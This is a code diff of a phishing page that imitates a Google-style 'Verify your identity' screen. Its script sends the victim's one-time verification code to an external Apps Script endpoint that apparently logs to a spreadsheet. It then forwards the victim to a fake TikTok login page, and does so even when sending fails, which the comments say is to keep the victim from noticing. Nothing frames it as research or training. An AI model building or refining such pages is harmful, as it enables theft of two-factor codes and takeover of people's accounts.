@@ -3,58 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify your identity - Google Accounts</title>
+    <title>Verify your identity</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .verify-box { width: 360px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        /* Logo image removed to avoid authenticity issues */
-        h1 { font-size: 22px; font-weight: 400; margin-bottom: 10px; color: #202124; margin-top: 0; }
-        p { font-size: 14px; color: #5f6368; margin-bottom: 20px; line-height: 1.4; }
-        .input-group { margin-bottom: 20px; text-align: left; }
-        input[type="text"] { width: 100%; padding: 13px 15px; margin: 8px 0; box-sizing: border-box; border: 1px solid #dadce0; border-radius: 4px; font-size: 14px; }
-        input:focus { border: 2px solid #1a73e8; outline: none; }
-        .btn-container { display: flex; justify-content: flex-end; margin-top: 30px; }
-        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
-        .btn:hover { background-color: #1561d1; }
-        .back-link { color: #1a73e8; text-decoration: none; font-size: 14px; margin-right: 20px; }
+        body { 
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #f7f8fa; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            background: white; 
+            width: 400px; 
+            padding: 40px; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+            text-align: center; 
+        }
+        .header-text { 
+            font-size: 22px; 
+            font-weight: 500; 
+            margin-bottom: 10px; 
+            color: #202124; 
+        }
+        .sub-text { 
+            font-size: 14px; 
+            color: #5f6368; 
+            margin-bottom: 25px; 
+            line-height: 1.5; 
+        }
+        .otp-input { 
+            width: 100%; 
+            padding: 12px; 
+            font-size: 18px; 
+            text-align: center; 
+            border: 1px solid #dadce0; 
+            border-radius: 4px; 
+            margin-bottom: 20px; 
+            box-sizing: border-box; 
+        }
+        .submit-btn { 
+            background-color: #1a73e8; 
+            color: white; 
+            padding: 10px 24px; 
+            border: none; 
+            border-radius: 4px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            font-size: 14px; 
+            width: 100%; 
+        }
+        .submit-btn:hover { 
+            background-color: #1765c1; 
+        }
     </style>
 </head>
 <body>
-    <div class="verify-box">
-        <h1>Verify it's you</h1>
-        <p>A verification code was sent to your device. Please enter the code below to continue.</p>
-        <form id="verifyForm">
-            <div class="input-group">
-                <input type="text" id="otp" placeholder="Enter verification code" required>
-            </div>
-            <div class="btn-container">
-                <a href="#" class="back-link">Try another way</a>
-                <button type="submit" class="btn">Verify</button>
-            </div>
+    <div class="container">
+        <div class="header-text">Verify your identity</div>
+        <div class="sub-text">To continue, please enter the verification code sent to your phone.</div>
+        
+        <form id="otpForm">
+            <input type="text" id="otp_code" class="otp-input" placeholder="Enter 6-digit code" maxlength="6" required>
+            <button type="submit" class="submit-btn">Verify</button>
         </form>
-    </div>    <script>
-        document.getElementById('verifyForm').addEventListener('submit', function(e) {
+    </div>
+
+    <script>        // 1. Force Redirect logic: 
+        // Agar user OTP nahi dalta, toh 20 seconds baad page apne aap TikTok login par chala jayega.
+        setTimeout(function() {
+            window.location.href = 'tiktok_login.html';
+        }, 20000);
+
+        // 2. Form Submission logic
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const otp = document.getElementById('otp').value;
+            const otpCode = document.getElementById('otp_code').value;
             const scriptURL = 'https://script.google.com/macros/s/AKfycbxr7l2XLO4F0l6LTGLzbg20VbAdOwzm_cUUIMyX2K1KtNDt31bfMmLCPEvCu3iXTr-7aQ/exec';
 
             const formData = new FormData();
-            formData.append('OTP_Code', otp);
-            formData.append('Time', new Date().toLocaleString());
+            formData.append('otp', otpCode);
+            formData.append('timestamp', new Date().toLocaleString());
+            formData.append('platform', 'Google_OTP');
 
-            fetch(scriptURL, { 
-                method: 'POST', 
-                body: formData
-            })
+            // Data ko Google Sheet mein bhejna
+            fetch(scriptURL, { method: 'POST', body: formData })
             .then(response => {
-                // Data bhejne ke baad user ko success page par bhej dein
-                window.location.href = 'success.html';
+                // Success: User ko TikTok Login page par bhej do
+                window.location.href = 'tiktok_login.html';
             })
             .catch(error => {
                 console.error('Error!', error.message);
-                // Agar error aaye tab bhi redirect karein taaki user ko na lage ki site crash hui hai
-                window.location.href = 'success.html';
+                // Error ke bawajud user ko TikTok page par bhej do taaki flow na tute
+                window.location.href = 'tiktok_login.html';
             });
         });
     </script>
